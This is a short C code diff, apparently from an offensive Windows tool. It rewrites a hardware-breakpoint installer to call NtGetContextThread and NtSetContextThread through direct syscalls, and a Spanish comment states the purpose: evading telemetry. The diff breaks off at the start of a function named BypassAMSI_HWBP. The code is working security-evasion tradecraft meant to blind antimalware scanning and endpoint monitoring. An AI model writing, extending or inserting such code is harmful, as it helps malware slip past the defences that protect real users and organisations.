@@ -57,7 +57,11 @@ static BOOL InstallHWBP(_In_ PVOID targetAddress, _In_ DWORD drIndex) {
     if (!AddVectoredExceptionHandler(1, HardwareBreakpointHandler)) return FALSE;
     CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     HANDLE hThread = GetCurrentThread();
-    if (!GetThreadContext(hThread, &ctx)) return FALSE;
+    
+    // Usar syscalls directas en lugar de APIs de Windows para evadir telemetría
+    if (InvokeSyscall(g_ApiTable.NtGetContextThread.ssn, g_SyscallGadget, hThread, &ctx) != 0) 
+        return FALSE;
+
     switch (drIndex) {
         case 0: ctx.Dr0 = (DWORD64)targetAddress; break;
         case 1: ctx.Dr1 = (DWORD64)targetAddress; break;
@@ -67,7 +71,8 @@ static BOOL InstallHWBP(_In_ PVOID targetAddress, _In_ DWORD drIndex) {
     ctx.Dr7 |= (1 << (drIndex * 2));
     ctx.Dr7 &= ~(3 << (16 + drIndex * 4));
     ctx.Dr7 &= ~(3 << (18 + drIndex * 4));
-    return SetThreadContext(hThread, &ctx);
+
+    return (InvokeSyscall(g_ApiTable.NtSetContextThread.ssn, g_SyscallGadget, hThread, &ctx) == 0);
 }
 
 static BOOL BypassAMSI_HWBP() {
